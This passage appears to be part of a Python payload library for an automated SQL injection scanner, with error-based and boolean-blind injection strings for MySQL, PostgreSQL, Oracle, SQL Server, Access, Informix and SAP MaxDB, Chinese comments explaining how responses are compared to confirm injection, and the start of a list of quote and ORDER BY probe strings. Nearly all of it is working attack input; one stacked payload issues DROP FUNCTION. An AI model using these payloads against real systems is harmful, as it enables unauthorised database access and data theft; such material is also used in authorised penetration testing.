         'payload': " ,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))"},
    'INJPAY_0':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"},
    'INJPAY_1':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"},
    'INJPAY_2':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"},
    'INJPAY_3':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"},
    'INJPAY_4':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))"},
    'INJPAY_5':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))"},
    'INJPAY_6':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"},
    'INJPAY_7':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"},
    'INJPAY_8':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))"},
    'INJPAY_9':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))"},
    'INJPAY_53':
        {'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"},
    'INJPAY_49':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"},
    'INJPAY_48':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)"},
    'INJPAY_45':
        {'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))"},
    'INJPAY_44':
        {'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"},
    'INJPAY_47':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)"},
    'INJPAY_46':
        {'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " ,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)"},
    'INJPAY_41':
        {'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))"},
    'INJPAY_40':
        {'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))"},
    'INJPAY_43':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')"},
    'INJPAY_42':
        {'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]',
         'payload': " (CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))"}

}

'''
正请求payload  负请求comparsion
url1 代表？id=1
url2 代表？id=-100

在url1情况下： 本身页面就是对的
    LEVEL 1 代表正请求与原始页面一样，正请求与错误页面不一样，正请求与负请求页面不一样，负请求与原始页面不一样，负请求与错误页面可能一样(有waf就一样) -->存在注入
    LEVEL 2 代表正请求与原始页面不一样，正请求与错误页面可能不一样，正请求与负请求页面不一样，负请求与原始页面一样，负请求与错误页面不一样(有waf就一样)
    LEVEL 3 代表正请求与原始页面一样，正请求与错误页面不一样，正请求与负请求页面不一样，负请求与原始页面不一样，负请求与错误页面可能一样(有waf就一样)

在url2 情况下：本身页面就是错的
算了先不管这个了
    LEVEL 1 代表正请求与原始页面一样，正请求与错误页面可能不一样(有waf就一样)，正请求与负请求页面一样，负请求与原始页面不一样，负请求与错误页面可能一样

RANDNUM #随机数字
ORIGVALUE#url中id对应值
RANDNUM1 # 随机数字+1
RANDSTR  # 随机字母
RANDNUM2 # 随机数字+2

'''
bool_blind_injection = {

    "INJPAY_27":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'dbms': 'Microsoft SQL Server',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'level': '3'},
    "INJPAY_26":
        {
            'comparsion': ' and (SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)',
            'dbms': 'PostgreSQL',
            'payload': ' and (SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)',
            'level': '3'},
    "INJPAY_25":
        {
            'comparsion': ' and (SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)',
            'dbms': 'PostgreSQL',
            'payload': ' and (SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)',
            'level': '3'},
    "INJPAY_24":
        {'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))',
         'dbms': 'PostgreSQL',
         'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))',
         'level': '3'},
    "INJPAY_23":
        {'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))',
         'dbms': 'PostgreSQL',
         'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))',
         'level': '3'},
    "INJPAY_22":
        {'comparsion': ' and ([RANDNUM]=[RANDNUM1])*[ORIGVALUE]', 'dbms': 'MySQL',
         'payload': ' and ([RANDNUM]=[RANDNUM])*[ORIGVALUE]', 'level': '3'},
    "INJPAY_21":
        {'comparsion': ' and ([RANDNUM]=[RANDNUM1])*[RANDNUM1]', 'dbms': 'MySQL',
         'payload': ' and ([RANDNUM]=[RANDNUM])*[RANDNUM1]', 'level': '3'},
    "INJPAY_20":
        {'comparsion': ' and ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])', 'dbms': 'MySQL',
         'payload': ' and ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])', 'level': '3'},
    "INJPAY_50":
        {'comparsion': ' HAVING [RANDNUM]=[RANDNUM1]', 'dbms': 'MySQL', 'payload': ' HAVING [RANDNUM]=[RANDNUM]',
         'level': '1'},
    "INJPAY_29":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'dbms': 'Oracle',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'level': '3'},
    "INJPAY_28":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'dbms': 'Microsoft SQL Server',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'level': '3'},
    "INJPAY_51":
        {
            'comparsion': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)',
            'dbms': 'MySQL',
            'payload': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)',
            'level': '1'},
    "INJPAY_38":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))',
            'dbms': 'MySQL',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))',
            'level': '1'},
    "INJPAY_39":
        {'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))',
         'dbms': 'PostgreSQL', 'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))',
         'level': '1'},
    "INJPAY_55":
        {
            'comparsion': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)',
            'dbms': 'Microsoft SQL Server',
            'payload': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)',
            'level': '1'},
    "INJPAY_58":
        {'comparsion': ' ;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END', 'dbms': 'SAP MaxDB',
         'payload': ' ;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END', 'level': '1'},
    "INJPAY_30":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'dbms': 'Oracle',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'level': '3'},
    "INJPAY_31":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)',
            'dbms': 'Informix',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)',
            'level': '3'},
    "INJPAY_32":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)',
            'dbms': 'Informix',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)',
            'level': '3'},
    "INJPAY_33":
        {'comparsion': ' and IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)', 'dbms': 'Microsoft Access',
         'payload': ' and IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)', 'level': '3'},
    "INJPAY_34":
        {'comparsion': ' and IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)', 'dbms': 'Microsoft Access',
         'payload': ' and IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)', 'level': '3'},
    "INJPAY_35":
        {
            'comparsion': ' and (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)',
            'dbms': 'MySQL',
            'payload': ' and (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)',
            'level': '3'},
    "INJPAY_36":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))',
            'dbms': 'MySQL',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))',
            'level': '1'},
    "INJPAY_37":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))',
            'dbms': 'MySQL',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))',
            'level': '1'},
    "INJPAY_12":
        {'comparsion': ' OR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]', 'dbms': 'MySQL',
         'payload': ' OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]', 'level': '2'},
    "INJPAY_13":
        {
            'comparsion': " AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
            'dbms': 'PostgreSQL',
            'payload': " AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
            'level': '1'},
    "INJPAY_10":
        {'comparsion': ' OR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])', 'dbms': 'MySQL',
         'payload': ' OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])', 'level': '2'},
    "INJPAY_11":
        {'comparsion': ' AND ([RANDNUM]=[RANDNUM1])*[RANDNUM1]', 'dbms': 'MySQL',
         'payload': ' AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]', 'level': '1'},
    "INJPAY_16":
        {
            'comparsion': ' OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL',
            'dbms': 'Oracle',
            'payload': ' OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL',
            'level': '2'},
    "INJPAY_17":
        {
            'comparsion': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))',
            'dbms': 'MySQL',
            'payload': ' and (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))',
            'level': '3'},
    "INJPAY_14":
        {
            'comparsion': " OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
            'dbms': 'PostgreSQL',
            'payload': " OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL",
            'level': '2'},
    "INJPAY_15":
        {
            'comparsion': ' AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL',
            'dbms': 'Oracle',
            'payload': ' AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL',
            'level': '1'},
    "INJPAY_18":
        {'comparsion': ' and MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])', 'dbms': 'MySQL',
         'payload': ' and MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])', 'level': '3'},
    "INJPAY_19":
        {'comparsion': ' and ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])', 'dbms': 'MySQL',
         'payload': ' and ELT([RANDNUM]=[RANDNUM],[RANDNUM1])', 'level': '3'},
    "INJPAY_52":
        {'comparsion': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)',
         'dbms': 'PostgreSQL',
         'payload': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)', 'level': '1'},
    "INJPAY_56":
        {
            'comparsion': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL',
            'dbms': 'Oracle',
            'payload': ' ;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL',
            'level': '1'},
    "INJPAY_57":
        {'comparsion': ' ;IIF([RANDNUM]=[RANDNUM1],1,1/0)', 'dbms': 'Microsoft Access',
         'payload': ' ;IIF([RANDNUM]=[RANDNUM],1,1/0)', 'level': '1'},
    "INJPAY_54":
        {'comparsion': ' ;IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]',
         'dbms': 'Microsoft SQL Server',
         'payload': ' ;IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]', 'level': '1'},
    "INJPAY_1":
        {'comparsion': ' AND [RANDNUM]=[RANDNUM1]', 'dbms': 'MySQL', 'payload': ' AND [RANDNUM]=[RANDNUM]',
         'level': '1'},
    "INJPAY_2":
        {'comparsion': ' OR [RANDNUM]=[RANDNUM1]', 'dbms': 'MySQL', 'payload': ' OR [RANDNUM]=[RANDNUM]', 'level': '2'},
    "INJPAY_3":
        {'comparsion': ' OR NOT [RANDNUM]=[RANDNUM1]', 'dbms': 'MySQL', 'payload': ' OR NOT [RANDNUM]=[RANDNUM]',
         'level': '1'},
    "INJPAY_4":
        {'comparsion': ' AND [RANDNUM]=[RANDNUM1]', 'dbms': 'Microsoft Access', 'payload': ' AND [RANDNUM]=[RANDNUM]',
         'level': '1'},
    "INJPAY_5":
        {'comparsion': ' OR [RANDNUM]=[RANDNUM1]', 'dbms': 'Microsoft Access', 'payload': ' OR [RANDNUM]=[RANDNUM]',
         'level': '2'},
    "INJPAY_6":
        {'comparsion': ' RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))',
         'dbms': 'MySQL', 'payload': ' RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))',
         'level': '1'},
    "INJPAY_7":
        {'comparsion': ' AND MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])', 'dbms': 'MySQL',
         'payload': ' AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])', 'level': '1'},
    "INJPAY_8":
        {'comparsion': ' OR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])', 'dbms': 'MySQL',
         'payload': ' OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])', 'level': '2'},
    "INJPAY_9":
        {'comparsion': ' AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])', 'dbms': 'MySQL',
         'payload': ' AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])', 'level': '1'},
    "INJPAY_53":
        {
            'comparsion': ' ;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1',
            'dbms': 'PostgreSQL',
            'payload': ' ;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1',
            'level': '1'},
    "INJPAY_49":
        {'comparsion': ' ,(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)', 'dbms': 'SAP MaxDB',
         'payload': ' ,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)', 'level': '1'},
    "INJPAY_48":
        {'comparsion': ' ,(CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END)', 'dbms': 'SAP MaxDB',
         'payload': ' ,(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)', 'level': '1'},
    "INJPAY_45":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'dbms': 'Oracle',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'level': '1'},
    "INJPAY_44":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'dbms': 'Oracle',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)',
            'level': '1'},
    "INJPAY_47":
        {'comparsion': ' ,IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)', 'dbms': 'Microsoft Access',
         'payload': ' ,IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)', 'level': '1'},
    "INJPAY_46":
        {'comparsion': ' ,IIF([RANDNUM]=[RANDNUM1],1,1/0)', 'dbms': 'Microsoft Access',
         'payload': ' ,IIF([RANDNUM]=[RANDNUM],1,1/0)', 'level': '1'},
    "INJPAY_41":
        {
            'comparsion': ' ,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)',
            'dbms': 'PostgreSQL',
            'payload': ' ,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)',
            'level': '1'},
    "INJPAY_40":
        {'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))',
         'dbms': 'PostgreSQL',
         'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))',
         'level': '1'},
    "INJPAY_43":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'dbms': 'Microsoft SQL Server',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'level': '1'},
    "INJPAY_42":
        {
            'comparsion': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'dbms': 'Microsoft SQL Server',
            'payload': ' ,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))',
            'level': '1'}
}
# level 1 简单测试
# level 2 盲注判断注入
# level 3 强制爆错
# 先get测试在post测试

level11_payloads = (
"'", "')", "';", '"', '")', '";', ' order By 500 ', "--", "-0", ") AND 1998=1532 AND (5526=5526", " AND 5434=5692%23",
" %' AND 5268=2356 AND '%'='", " ') AND 6103=4103 AND ('vPKl'='vPKl",
